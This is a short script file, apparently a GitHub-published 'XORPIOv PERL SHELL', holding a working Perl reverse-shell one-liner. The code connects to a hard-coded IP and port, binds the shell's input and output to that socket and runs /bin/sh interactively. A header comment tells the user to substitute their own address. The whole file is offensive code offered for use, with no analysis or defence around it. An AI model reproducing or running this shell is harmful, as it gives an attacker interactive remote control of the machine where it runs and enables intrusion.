# XORPIOv PERL SHELL | A Reverse Shell in PERL.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

perl -e 'use Socket;$i="10.0.22.8";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
